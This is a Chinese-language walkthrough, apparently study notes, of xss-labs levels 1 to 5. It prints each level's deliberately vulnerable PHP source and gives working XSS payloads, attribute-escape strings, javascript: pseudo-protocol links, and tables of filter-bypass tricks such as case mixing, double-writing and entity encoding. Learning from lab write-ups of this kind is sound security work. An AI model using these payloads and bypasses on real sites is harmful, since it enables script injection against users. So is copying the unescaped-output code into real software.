---
title: "Xss-labs通关全解&&XSS笔记01"
publishDate: 2025-12-26 18:37:00
description: "分析以及笔记"
tags: ["XSS", "笔记", "Web"]
language: "中文"

---

> 初学者学习并且参考整理的笔记，仅供参考，非专业人员，难免有疏忽，借鉴他人，AI辅助之处，见谅。
> 
> 我选择直接使用源码呈现（正常情况下是无法看到完整源码的，只能看到页面源码）,一方面是省去试错payload所占用的篇幅，另一方面也是为了日后温习时能更加直观，不需要再挂其他的了，我觉得大部分过滤的方法都可以被试出来，多输入几次总归可以。\

## 第一关

 源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.从上往下分析，可以看到`window.alert`被自定义函数重写。

```php
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
```

2.可以看到在html代码里插入了php代码段。

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

其中`ini_set("display_errors", 0)`;用于忽略报错信息

然后通过get请求获得了**name**的值赋给了str

```php
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

很显然这里就是我们的注入点，直接将传入的值插入，没有进行任何过滤。

3.那么我们就可以很简单的构造payload

```html
?name=<script>alert(1)</script> //这里 alert()里面随便写什么都行
```

### 执行js代码的几种方式

| **方式**    | **Payload 示例**                 | **适用场景**             | **备注**         |
| --------- | ------------------------------ | -------------------- | -------------- |
| **标准标签**  | `<script>alert(1)</script>`    | 无过滤，直接输出             | 最容易被拦截         |
| **图片报错**  | `<img src=1 onerror=alert(1)>` | 过滤了 `<script>`       | **实战最常用**，自动触发 |
| **交互事件**  | `<div onmouseover=alert(1)>`   | 过滤了 `src` 或 `script` | 需要诱导用户操作       |
| **伪协议**   | `<a href=javascript:alert(1)>` | 注入点在 `a` 标签内部        | 常见于点击链接处       |
| **SVG标签** | `<svg/onload=alert(1)>`        | 现代浏览器，过滤 `img`       | HTML5 新特性      |

## 第二关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.可以看到呢核心最终还是触发alert方法

2.局部聚焦于htmlspecialchars函数，可以看到h2标签无法作为注入点使用，原因如下。

### htmlspecialchars

**.htmlspecialchars** 方法 它的作用是把**预定义的字符**转换为 **HTML 实体**。简单来说，就是把具有“功能性”的代码符号，变成了纯粹的“文本显示符号”。浏览器看到实体后，只会把它显示出来，而不会把它当作代码去执行。

| **输入字符** | **转换后的实体** | **含义**                    |
| -------- | ---------- | ------------------------- |
| `&`      | `&amp;`    | 和号                        |
| `"`      | `&quot;`   | **双引号** (重点)              |
| `<`      | `&lt;`     | 小于号 (直接杀死了 `<script>` 标签) |
| `>`      | `&gt;`     | 大于号                       |

默认情况下（在 PHP 8.1 之前），它不转换单引号 (`'`)！

这个函数的完整语法其实是： `htmlspecialchars(string, flags, encoding)`

这里的 `flags` 参数决定了它的防御等级：

* **`ENT_COMPAT` (旧版默认值):** 转换双引号，**保留单引号**。

* **`ENT_QUOTES`:** 同时转换双引号和单引号。

* **`ENT_NOQUOTES`:** 都不转换。

开发者在调用时往往懒省事，只写 `htmlspecialchars($str)`，没加 `ENT_QUOTES` 参数。 **这就给了我们用“单引号”进行闭合绕过的机会。**

3.注入点

```html
<input name=keyword  value="'.$str.'">
```

依旧是直接拼接（在输入框中），这里的`input` 是不安全的，分析可知 我们可以通过提前闭合 value=后的第一个`"` 进而插入

4.我们就可以构造最简单的payload，插入的可以选择`input`的属性

```php
" onclick="alert(1) //注意这里alert(1)前只有一个"因为要和后面的"闭合，以及空格
```

如果只是想过关，到这里也就结束了，下面的是更多样化的选择。

同样的，我们也可以选择其他的属性

### `<input>` 标签 XSS 触发属性速查表

| **属性 (Attribute)**     | **触发条件 (Trigger Condition)** | **构造示例 (Payload)**                 | **CTF/实战 推荐指数 & 评价**                                                           |
| ---------------------- | ---------------------------- | ---------------------------------- | ------------------------------------------------------------------------------ |
| **`onfocus`**          | **当输入框获得焦点时触发**。             | `" onfocus=alert(1) autofocus="`   | 加上 `autofocus` 属性后，页面加载完成后会自动聚焦，实现 **“无交互 (Zero-click)”** 自动触发 XSS。但是容易卡死，死循环。 |
| **`onmouseover`**      | **当鼠标指针移动到输入框上方时触发**。        | `" onmouseover=alert(1) "`         | 需要用户鼠标划过。如果输入框很大或者位置很显眼，成功率尚可，但不如自动触发稳。                                        |
| **`onclick`**          | **当用户点击输入框时触发**。             | `" onclick=alert(1) "`             | 需要用户主动点击。这是最被动的方式，除非你配合社工诱导用户去点击。                                              |
| **`oninput`**          | **当用户在输入框内输入/修改内容时触发**。      | `" oninput=alert(1) "`             | 需要用户进行输入操作。通常用于搜索框等用户必须打字的场景。                                                  |
| **`onchange`**         | **当内容改变且失去焦点时触发**。           | `" onchange=alert(1) "`            | 比较难触发，既要改内容，又要点别的地方，条件太苛刻。                                                     |
| **`onblur`**           | **当输入框失去焦点时触发**。             | `" onblur=alert(1) autofocus="`    | 可以配合 `autofocus`，一旦用户点击页面的其他地方（失去焦点），就会触发。                                     |
| **`oncut` / `oncopy`** | **当用户剪切/复制输入框内容时触发**。        | `" value="点我复制" oncopy=alert(1) "` | 非常特定的场景才有用（例如诱导用户复制某些兑换码）。                                                     |

> 注意这里"前后基本上都有个空格

这里关于`"` 闭合的情况还可以有其他的样式，具体可看表格

| **写法类型**           | **示例**               | **规则与限制**                    |
| ------------------ | -------------------- | ---------------------------- |
| **双引号包裹**          | `onclick="alert(1)"` | 最标准写法。值里面可以包含空格、单引号。         |
| **单引号包裹**          | `onclick='alert(1)'` | 标准写法。值里面可以包含空格、双引号。          |
| **无引号 (Unquoted)** | `onclick=alert(1)`   | **只要值里面不包含“破坏性字符”，就可以不加引号。** |

“破坏性字符” 是什么？

如果你想使用 **无引号** 写法（`onclick=payload`），你的 Payload 里面**绝对不能包含**以下字符，否则 HTML 解析器会认为属性值结束了：

* **空格** (最关键的限制)

* `"` (双引号)

* `'` (单引号)

* `=` (等号)

* `<` (小于号)

* `>` (大于号)

* `` ` `` (反引号)

这一关也比较简单没有对input内的进行转义，还可以考虑 **标签逃逸** 和 **伪协议** 

### 标签逃逸

后端**没有**转义/过滤尖括号 `<` 和 `>`。 **攻击原理**：利用 `>` 强制结束当前的 `<input>` 标签，然后自由插入新的 HTML 标签。

| **攻击变种**           | **适用场景 (Condition)**             | **构造示例 (Payload)**                      | **原理解析**                                                      |
| ------------------ | -------------------------------- | --------------------------------------- | ------------------------------------------------------------- |
| **直接插入 Script**    | 最理想的情况，后端只检查了引号闭合，完全没管标签。        | `"> <script>alert(1)</script>`          | 1. `">` 闭合原 input。<br>2. 浏览器解析执行完整的 JS 脚本块。                   |
| **利用 img/svg**     | 后端过滤了 `<script>` 关键字，但没过滤 `< >`。 | `"> <img src=x onerror=alert(1)>`       | 1. `">` 闭合原 input。<br>2. 利用图片加载失败（src=x）触发 `onerror` 事件执行 JS。 |
| **利用 body/iframe** | 需要更隐蔽或特定上下文，或者 `img` 标签也被监控时。    | `"> <iframe onload=alert(1)>`           | 1. `">` 闭合原 input。<br>2. iframe 加载完成时触发 `onload`。             |
| **利用 input (递归)**  | 你想弹窗，但不想破坏页面结构，看起来像个正常的框。        | `"> <input onfocus=alert(1) autofocus>` | 1. `">` 闭合原 input。<br>2. 插入一个新的、自带攻击属性的 input 标签。还是有可能会死循环    |

### 伪协议与特殊 Type

无法使用 `<script>` 标签，且常见的 `on*` 事件（如 `onclick`, `onmouseover`）被 WAF 过滤，但允许修改 `type` 属性或 URL 相关的属性。 **攻击原理**：利用浏览器支持 `javascript:` 伪协议的特性，将 JS 代码伪装成链接或表单提交目标。

| **攻击变种**          | **适用场景 (Condition)**                           | **构造示例 (Payload)**                                 | **原理解析**                                                                                                                         |
| ----------------- | ---------------------------------------------- | -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **表单劫持 (Submit)** | 这是一个输入框，但你可以改变它的 `type` 为 `submit`。            | `" type="submit" formaction="javascript:alert(1)"` | 1. `type="submit"` 把输入框变身成提交按钮。<br>2. `formaction` 覆盖了原本 form 的 action 地址。<br>3. 点击按钮 -> 浏览器尝试跳转到 `javascript:alert(1)` -> 代码执行。 |
| **图片按钮 (Image)**  | 另一种将 input 变为按钮的方式 (较老但在部分浏览器有效)。              | `" type="image" src="javascript:alert(1)"`         | 1. `type="image"` 把它变成图片按钮。<br>2. 点击图片时尝试执行 src 中的伪协议代码。<br>_(注：现代浏览器对此防御较严，成功率低于 formaction)_                                   |
| **超链接劫持 (A标签)**   | **(延伸)** 如果你的输入是在 `<a href="...">` 中而不是 input。 | `" href="javascript:alert(1)"`                     | 1. 直接闭合前面的引号。<br>2. 点击链接直接触发 JS。<br>_(常用于 href 属性注入场景)_                                                                          |

### 绕过过滤

对这一关没必要且不适用

当简单的 `onclick` 或 `<script>` 被 WAF（防火墙）或后端代码无情地拦截、替换或删除时。

| **技巧 (Technique)**               | **适用场景 (Condition)**                                     | **构造示例 (Payload)**                                                  | **原理解析 & 评价**                                                               |
| -------------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| **大小写绕过**<br>(Case Sensitivity)  | 后端过滤代码**只匹配小写**。<br>例如：`str_replace("script", "", $str)` | `" OnIcK=alert(1) "<br>"> <ScRiPt>alert(1)</sCrIpT>`                | HTML 对标签和属性**不区分大小写**，但后端的过滤代码（PHP/Python/Java）可能是区分大小写的。                   |
| **双写绕过**<br>(Double Writing)     | 后端将敏感词**替换为空**，且**只替换一次**。<br>例如：把 `script` 替换为 `""`。    | `"> <scrscriptipt>alert(1)</script>`<br>`" oonnfocus=alert(1) "`    | 当中间的 `script` 被删掉后，左右剩下的字符自动拼合，正好重新组成了 `script`。                            |
| **HTML 实体编码**<br>(HTML Entity)   | 后端过滤了 `alert`、`(` 等特殊字符，但没过滤 `&` 和 `#`。                  | `" onclick=&#97;lert(1) "`<br>`" onclick=alert&#40;1&#41; "`        | 浏览器解析顺序：**HTML解码 -> JS执行**。浏览器看到 `&#97;` 会先把它还原成 `a`，然后再交给 JS 引擎执行 `alert`。 |
| **空格绕过**<br>(Space Bypass)       | 后端通过正则过滤了空格 ，导致无法分隔属性。                                   | `"onfocus=alert(1)autofocus="`<br>`"type="text"/onfocus=alert(1)/*` | HTML 解析器允许用 `/` (斜杠) 代替空格来分隔属性。                                             |
| **利用伪协议替换**<br>(Protocol Bypass) | `javascript:` 关键字被过滤。                                    | `" type="submit" formaction="java&#115;cript:alert(1)"`             | 利用 HTML 实体编码打断关键字，`&#115;` 是 `s`，浏览器解码后依然能认出这是 `javascript:`。               |
| **等效函数替换**<br>(Function Sub)     | `alert()` 函数被精准封杀。                                       | `confirm(1)`<br>`prompt(1)`<br>`top['al'+'ert'](1)`                 | 弹窗不一定要用 `alert`，`confirm` 和 `prompt` 也是弹窗。或者利用 JS 的字符串拼接特性绕过关键字检测。          |

## 第三关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>    
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.还是触发`alert` 不多叙述了

2.可以看到跟第二关一样`echo` h2被 转义了

```php
<input name=keyword  value='".htmlspecialchars($str)."'>  
```

但是不同的是不像上一关`$str` 直接被传入，这一关经过了一层 `htmlspecialchars` 转义 [点击这里跳转到 htmlspecialchars](#htmlspecialchars)

这里我们使用的是其默认不转换单引号的特性，同时题目中也使用 `'` 对我们进行了暗示

剩下内容就和第二关默认的payload相似了

3.我们可以很简单的构造

```php
' onclick='alert(1) 
```

其他属性可以参照[这里](#input-标签-xss-触发属性速查表) 基本上只有单引号和双引号之间的区别
以及尝试[伪协议与特殊 Type](#伪协议与特殊-type) 大部分也可以

## 第四关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level5.php?keyword=find a way out!"; 
}
</script>
<title>欢迎来到level4</title>
</head>
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>

```

1.触发`alert`

2.只是将`<` 和`>` 给过滤了，并且没有进行转义，可以利用`"`  进行闭合，这样就很好办了，可以接着无脑[属性闭环](#input-标签-xss-触发属性速查表)了

```php
" onclick ="alert(1) 
```

## 第五关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>


```

1.触发`alert`

2.这里强制把所有大写转换成了小写，证明我们无法使用大小写绕过了

```php
$str = strtolower($_GET["keyword"]);
```

3.可以看到这里把`<script` 替换成了 `<scr_ipt` 以及 把`on` 替换成了 `o_n`

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

3.这里我们可以结合[伪协议与特殊 Type](#伪协议与特殊-type) 以及 [标签逃逸](#标签逃逸), 我们就可以构造出

```php
"> <a href="javascript:alert(1)">点击通关</a>
```

4.这一关除了上面提到的源码中呈现的大小写替换以及其他替换（例如formaction中on被替换），还有一种类型payload问题在于浏览器的安全机制

利用图片类的标签，如 `<input type="image" src="javascript:alert(1)">` 或 `<img src="javascript:alert(1)">`代码成功绕过了所有 PHP 过滤，完整地发给了浏览器。

**但是**：

1. 浏览器看到标签是 `img` 或 `input type="image"`。

2. 浏览器认为：“这是一个静态资源（图片），它的 `src` 应该是一个 URL 地址。”

3. 浏览器**禁止**在图片资源的 `src` 属性中执行 JS 代码。

4. 浏览器尝试加载这个“图片”，发现加载不出来，于是显示一个裂图图标，**代码并未执行**。

也就是说在现代浏览器中，图片属性的 `src` 永远不会执行脚本。

`<a>`显然成为了最优解。


